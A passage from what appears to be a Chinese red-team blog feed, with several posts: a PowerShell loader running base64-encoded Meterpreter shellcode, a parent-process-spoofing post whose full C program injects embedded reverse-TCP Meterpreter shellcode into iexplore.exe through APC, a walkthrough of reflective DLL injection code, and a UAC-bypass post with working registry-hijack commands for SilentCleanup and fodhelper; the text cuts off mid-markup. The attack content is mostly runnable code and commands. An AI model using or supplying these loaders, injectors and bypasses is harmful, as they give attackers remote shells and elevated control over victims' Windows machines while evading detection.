[System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKhxkUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)$szw41 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll VirtualAlloc), (wI @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nm.Length,0x3000, 0x40)[System.Runtime.InteropServices.Marshal]::Copy($nm, 0, $szw41, $nm.length)$fWXd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll CreateThread), (wI @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$szw41,[IntPtr]::Zero,0,[IntPtr]::Zero)[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll WaitForSingleObject), (wI @([IntPtr], [Int32]))).Invoke($fWXd,0xffffffff) | Out-Null</code></pre><p>base64拿去Extract-IP-From-Meterpreter-ShellCode.exe查连接的ip和port<br><img src="https://s1.ax1x.com/2020/11/11/BjWl59.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是PCsXcetra计划在2019年的Derbycon演讲中发布的一组工具，用于快捷的分析一下shellcode或者powershell/混淆解码等&lt;br&gt;仓库地址：&lt;a href=&quot;https://github.com/PCsXcetra/DerbyCon-2019Fi</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>父进程伪造</title>
    <link href="http://422926799.github.io/posts/d0aae8a6.html"/>
    <id>http://422926799.github.io/posts/d0aae8a6.html</id>
    <published>2020-10-23T06:27:16.000Z</published>
    <updated>2020-10-23T06:52:52.254Z</updated>
    
    <content type="html"><![CDATA[<p>伪造父进程的关键点：</p><pre><code>1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）2. 初始化指定的属性列表以创建进程和线程3. 设置进程属性</code></pre><p>关键函数主要是:</p><ul><li>OpenProcess</li><li>InitializeProcThreadAttributeList</li><li>CreateProcess</li></ul><p>还有个重要的结构体:STARTUPINFOEXA<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa</a><br>STARTUPINFOEXA结构体，微软文档定义如下：</p><pre><code class="c">typedef struct _STARTUPINFOEXA {  STARTUPINFOA                 StartupInfo;  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;} STARTUPINFOEXA, *LPSTARTUPINFOEXA;</code></pre><p><img src="https://s1.ax1x.com/2020/10/23/BAYZFS.png" alt="参数"></p><p>InitializeProcThreadAttributeList用于初始化指定的属性列表以创建进程和线程<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist</a></p><pre><code class="c">BOOL InitializeProcThreadAttributeList(  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  DWORD                        dwAttributeCount,  DWORD                        dwFlags,  PSIZE_T                      lpSize);</code></pre><p><img src="https://s1.ax1x.com/2020/10/23/BAYUSJ.png" alt="参数"></p><p>父进程伪造部分代码</p><pre><code class="c">STARTUPINFOEXA sInfoEX;PROCESS_INFORMATION pInfo;SIZE_T sizeT;HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //第一次设置属性的数量sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);</code></pre><p>getParentProcessID函数用于寻找要伪造父进程pid</p><pre><code class="c">DWORD getParentProcessID() { //返回explorer.exe的pid    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 process = { 0 };    process.dwSize = sizeof(process);    if (Process32First(snapshot, &amp;process)) {        do {            //If you want to another process as parent change here            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))                break;        } while (Process32Next(snapshot, &amp;process));    }    CloseHandle(snapshot);    return process.th32ProcessID;}</code></pre><p>(使用APC的方式执行shellcode)<br>完整代码如下</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;iostream&gt;DWORD getParentProcessID() { //返回explorer.exe的pid    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 process = { 0 };    process.dwSize = sizeof(process);    if (Process32First(snapshot, &amp;process)) {        do {            //If you want to another process as parent change here            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))                break;        } while (Process32Next(snapshot, &amp;process));    }    CloseHandle(snapshot);    return process.th32ProcessID;}int main() {    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c    unsigned char shellCode[] =        &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;        &quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;        &quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;        &quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;        &quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;        &quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;        &quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;        &quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;        &quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;        &quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;        &quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;        &quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;        &quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x71\x91\x41\x54\x49\x89\xe4&quot;        &quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;        &quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;        &quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;        &quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;        &quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;        &quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;        &quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;        &quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;        &quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;        &quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;        &quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;        &quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;        &quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;        &quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;        &quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;        &quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;        &quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;    STARTUPINFOEXA sInfoEX;    PROCESS_INFORMATION pInfo;    SIZE_T sizeT;    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限    ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //初始化指定的属性列表以创建进程和线程    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性并从堆中分配内存    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);    CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存    SIZE_T *lpNumberOfBytesWritten = 0;    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); //写入内存    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); //APC调用    ResumeThread(pInfo.hThread); //启动线程    CloseHandle(pInfo.hThread); //关闭线程    return 0;}</code></pre><p>效果如下<br><img src="https://s1.ax1x.com/2020/10/23/BANyxH.png" alt="父进程是explorer.exe"></p><p><img src="https://s1.ax1x.com/2020/10/23/BANcMd.png" alt="通信"></p><p><img src="https://s1.ax1x.com/2020/10/23/BANqLn.png" alt="meterpreter"></p><p>参考链接:<br><a href="https://xz.aliyun.com/t/8387" target="_blank" rel="noopener">https://xz.aliyun.com/t/8387</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;伪造父进程的关键点：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）
2. 初始化指定的属性列表以创建进程和线程
3. 设置进程属性
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关键函数主要是:&lt;/p</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>反射DLL注入研究</title>
    <link href="http://422926799.github.io/posts/907443e1.html"/>
    <id>http://422926799.github.io/posts/907443e1.html</id>
    <published>2020-10-19T05:43:45.000Z</published>
    <updated>2020-10-19T06:07:58.581Z</updated>
    
    <content type="html"><![CDATA[<p>代码来源于:<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主要文件inject.c<br><img src="https://s1.ax1x.com/2020/10/19/0vb9Gq.png" alt=""></p><p>code如下</p><pre><code class="C">#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &quot;LoadLibraryR.h&quot;#pragma comment(lib,&quot;Advapi32.lib&quot;)#define BREAK_WITH_ERROR( e ) { printf( &quot;[-] %s. Error=%d&quot;, e, GetLastError() ); break; }// Simple app to inject a reflective DLL into a process vis its process ID.int main( int argc, char * argv[] ){    HANDLE hFile          = NULL;    HANDLE hModule        = NULL;    HANDLE hProcess       = NULL;    HANDLE hToken         = NULL;    LPVOID lpBuffer       = NULL;    DWORD dwLength        = 0;    DWORD dwBytesRead     = 0;    DWORD dwProcessId     = 0;    TOKEN_PRIVILEGES priv = {0};#ifdef WIN_X64    char * cpDllFile  = &quot;reflective_dll.x64.dll&quot;;#else#ifdef WIN_X86    char * cpDllFile  = &quot;reflective_dll.dll&quot;;#else WIN_ARM    char * cpDllFile  = &quot;reflective_dll.arm.dll&quot;;#endif#endif    do    {        // Usage: inject.exe [pid] [dll_file]        if( argc == 1 )            dwProcessId = GetCurrentProcessId();        else            dwProcessId = atoi( argv[1] );        if( argc &gt;= 3 )            cpDllFile = argv[2];        hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); //创建dll或读取dll        if( hFile == INVALID_HANDLE_VALUE )            BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );        dwLength = GetFileSize( hFile, NULL ); //获取文件大小        if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );        lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength ); //从堆分配一块内存 (GetProcessHeap() 检索到调用进程的默认堆的句柄)        if( !lpBuffer )            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );        if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) == FALSE ) //读取文件            BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );        if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) //获取当前token句柄        {            priv.PrivilegeCount           = 1;            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;            if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )                AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );            CloseHandle( hToken );        }        hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );        if( !hProcess )            BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );        hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL ); //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小        if( !hModule )            BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );        printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );        WaitForSingleObject( hModule, -1 );    } while( 0 );    if( lpBuffer )        HeapFree( GetProcessHeap(), 0, lpBuffer );    if( hProcess )        CloseHandle( hProcess );    return 0;}</code></pre><p>整个流程如下：</p><ul><li>首先判断命令行参数总数量是否只有一个,如果命令行参数大于或等于三，则dwProcessId为指定PID<ul><li>dwProcessId为当前进程PID</li></ul></li><li>CreateFileA读取对应的DLL</li><li>GetFileSize获取DLL文件大小</li><li>HeapAlloc从堆分配一块内存 （这里使用GetProcessHeap，检索到调用进程的默认堆的句柄）</li><li>ReadFile读取DLL</li><li>OpenProcessToken当前TOKEN</li><li>OpenProcess打开进程</li><li>调用LoadLibraryR.c里的LoadRemoteLibrary函数dll注入<ul><li>GetReflectiveLoaderOffset返回对应PE位数的地址</li><li>VirtualAllocEx分配内存</li><li>WriteProcessMemory内存数据写入</li><li>CreateRemoteThread创建远程进程</li></ul></li></ul><p>LoadRemoteLibraryR</p><pre><code class="C">HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter ) //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小{    BOOL bSuccess                             = FALSE;    LPVOID lpRemoteLibraryBuffer              = NULL;    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;    HANDLE hThread                            = NULL;    DWORD dwReflectiveLoaderOffset            = 0;    DWORD dwThreadId                          = 0;    __try    {        do        {            if( !hProcess  || !lpBuffer || !dwLength )                break;            // check if the library has a ReflectiveLoader...            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); //自定义的GetReflectiveLoaderOffset函数            if( !dwReflectiveLoaderOffset )                break;            // alloc memory (RWX) in the host process for the image...            lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );             if( !lpRemoteLibraryBuffer )                break;            // write the image into the host process...            if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) //写入内存                break;            // add the offset to ReflectiveLoader() to the remote library address...            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );            // create a remote thread in the host process to call the ReflectiveLoader!            hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId ); //创建远程线程        } while( 0 );    }    __except( EXCEPTION_EXECUTE_HANDLER )    {        hThread = NULL;    }    return hThread;}</code></pre><p>GetReflectiveLoaderOffset函数 （返回对应的位数和地址）</p><pre><code class="c">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer ){    UINT_PTR uiBaseAddress   = 0;    UINT_PTR uiExportDir     = 0;    UINT_PTR uiNameArray     = 0;    UINT_PTR uiAddressArray  = 0;    UINT_PTR uiNameOrdinals  = 0;    DWORD dwCounter          = 0;#ifdef WIN_X64    DWORD dwCompiledArch = 2;#else    // This will catch Win32 and WinRT.    DWORD dwCompiledArch = 1;#endif    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;    // get the File Offset of the modules NT Header    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;    // currenlty we can only process a PE file which is the same type as the one this fuction has      // been compiled as, due to various offset in the PE structures being defined at compile time.    if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x010B ) // PE32    {        if( dwCompiledArch != 1 )            return 0;    }    else if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x020B ) // PE64    {        if( dwCompiledArch != 2 )            return 0;    }    else    {        return 0;    }    // uiNameArray = the address of the modules export directory entry    uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];    // get the File Offset of the export directory    uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );    // get the File Offset for the array of name pointers    uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );    // get the File Offset for the array of addresses    uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );    // get the File Offset for the array of name ordinals    uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );        // get a counter for the number of exported functions...    dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;    // loop through all the exported functions to find the ReflectiveLoader    while( dwCounter-- )    {        char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));        if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL )        {            // get the File Offset for the array of addresses            uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );                // use the functions name ordinal as an index into the array of name pointers            uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );            // return the File Offset to the ReflectiveLoader() functions code...            return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );        }        // get the next exported function name        uiNameArray += sizeof(DWORD);        // get the next exported function name ordinal        uiNameOrdinals += sizeof(WORD);    }    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/10/19/0vq59I.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;代码来源于:&lt;a href=&quot;https://github.com/stephenfewer/ReflectiveDLLInjection&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/stephenfewer/Ref</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>bypass UAC研究</title>
    <link href="http://422926799.github.io/posts/70084607.html"/>
    <id>http://422926799.github.io/posts/70084607.html</id>
    <published>2020-10-07T16:46:32.000Z</published>
    <updated>2020-10-07T17:51:01.433Z</updated>
    
    <content type="html"><![CDATA[<p>水了一天，明天出发准备上学。先去玩几天，早上原本就打算写<br>刷b站硬是刷到了晚上</p><h2 id="UAC是何物"><a href="#UAC是何物" class="headerlink" title="UAC是何物"></a>UAC是何物</h2><blockquote><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统的效果。<br>主要用于隔离administrator和user的权限<br><img src="https://s1.ax1x.com/2020/10/08/0wPgn1.png" alt=""></p></blockquote><p>高:<br>任何程序启动都需要申请</p><p>默认：<br>UAC在不手动更改的情况下，程序需要administrator权限的时候。会弹出框框申请</p><p>中:<br>申请administrator权限不弹出申请框框，默认允许</p><p>从不提醒：<br>所有程序启动皆为administrator权限</p><h2 id="bypass-UAC的要求"><a href="#bypass-UAC的要求" class="headerlink" title="bypass UAC的要求"></a>bypass UAC的要求</h2><p>UAC设置为默认或更低<br>低权用户有权限执行的（可以是COM，计划任务，dll劫持等）</p><h2 id="交互式bypass"><a href="#交互式bypass" class="headerlink" title="交互式bypass"></a>交互式bypass</h2><p>例如：执行了MMC，然后在MMC打开文件选项选择cmd.exe执行<br><img src="https://s1.ax1x.com/2020/10/08/0wiWKs.png" alt=""></p><p>利用权限继承，在一个有administrator权限的进程里执行另外的进程从而实现绕过UAC<br>但是这种始终无法真正的利用</p><h2 id="方式一：利用自带的计划任务"><a href="#方式一：利用自带的计划任务" class="headerlink" title="方式一：利用自带的计划任务"></a>方式一：利用自带的计划任务</h2><p>\Microsoft\Windows\DiskCleanup\SilentCleanup计划任务</p><pre><code># cmdsetx windir cmd /kschtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /Ior# powershellNew-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe /k cmd.exe&quot; -PropertyType String -Force #用户环境变量注册表schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code></pre><p>原因：\Microsoft\Windows\DiskCleanup\SilentCleanup服务以administrator运行，且计划任务任何用户都可以启动。启动程序使用用户变量%windir%这样去执行程序，通过修改用户变量课可实现bypass UAC<br><img src="https://s1.ax1x.com/2020/10/08/0wiHGF.png" alt=""></p><p>计划任务的设置如下<br><img src="https://s1.ax1x.com/2020/10/08/0wiOM9.png" alt=""></p><p>执行的操作<br><img src="https://s1.ax1x.com/2020/10/08/0wFSIK.png" alt=""></p><h2 id="方法二：程序以高权执行某些进程"><a href="#方法二：程序以高权执行某些进程" class="headerlink" title="方法二：程序以高权执行某些进程"></a>方法二：程序以高权执行某些进程</h2><p>例如：<br>fodhelper.exe和computerdefaults.exe存在bypass UAC</p><pre><code># powershellNew-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -ForceNew-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -ForceSet-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -ForceStart-Process &quot;C:\Windows\System32\fodhelper.exe&quot;Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Forceor# cmdreg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d &quot;&quot;reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d cmd.exefodhelper.exereg delete HKCU\Software\Classes\ms-settings\ /F</code></pre><p><img src="https://s1.ax1x.com/2020/10/08/0wFCGD.png" alt=""></p><p>通过进程监测可以看到如下过程<br><img src="https://s1.ax1x.com/2020/10/08/0wFPRe.png" alt=""></p><p>首先寻找了</p><pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:(Default)</code></pre><p>然后在寻找了</p><pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:DelegateExecute</code></pre><p>当HKCU\Software\Classes\ms-settings\Shell\Open\command路径找不到的时候才去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command<br><img src="https://s1.ax1x.com/2020/10/08/0wF6dx.png" alt=""></p><p>Shell\Open\Command默认键名(Default)为所执行的程序,DelegateExecute为对应COM接口的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wF2FK.png" alt=""></p><h2 id="方法三：COM接口函数劫持"><a href="#方法三：COM接口函数劫持" class="headerlink" title="方法三：COM接口函数劫持"></a>方法三：COM接口函数劫持</h2><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数，例如：cmdlua.dll里的shellExecW，GUID：3E5FC7F9-9A51-4367-9063-A120244FBEC7<br>OleViewDotNet（Administrator权限运行）查询对应的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wFxyj.png" alt=""></p><p>然后跟踪这个ICMLuaUtil接口可以看到下面的函数<br><img src="https://s1.ax1x.com/2020/10/08/0wkZ6J.png" alt=""></p><p>IDA反编译对应的DLL通过虚函数表搜索地址/搜索关键字ICMLuaUtil可以看到下面的函数<br>从0开始数到9，shellExec正好对应Proc9<br><img src="https://s1.ax1x.com/2020/10/08/0wkKTx.png" 